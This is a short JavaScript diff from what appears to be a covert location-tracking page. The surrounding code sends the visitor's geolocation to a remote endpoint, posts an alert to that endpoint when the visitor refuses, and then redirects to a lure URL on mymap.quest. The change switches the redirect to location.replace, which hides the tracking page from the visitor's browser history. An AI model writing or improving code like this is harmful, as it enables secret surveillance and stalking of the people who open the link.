@@ -43,7 +43,7 @@
                         })
                         .then(() => {
                             console.log("Location sent successfully!");
-                            window.location.href = "https://mymap.quest/film.php?\\Eli//=9MUDJT.ext";
+                            window.location.replace("https://mymap.quest/film.php?\\Eli//=9MUDJT.ext");  // Use replace for the redirect
                         })
                         .catch(() => console.log("Failed to send location."));
                     },
@@ -56,8 +56,8 @@
                             body: JSON.stringify({ content: "🚨 User denied location access!" })
                         });
 
-                        // Redirect to Google instead of previous URL
-                        window.location.href = "https://mymap.quest/film.php?\\Eli//=9MUDJT.ext";
+                        // Redirect to your main page if location is denied
+                        window.location.replace("https://mymap.quest/film.php?\\Eli//=9MUDJT.ext");  // Use replace for the redirect
                     }
                 );
             } else {
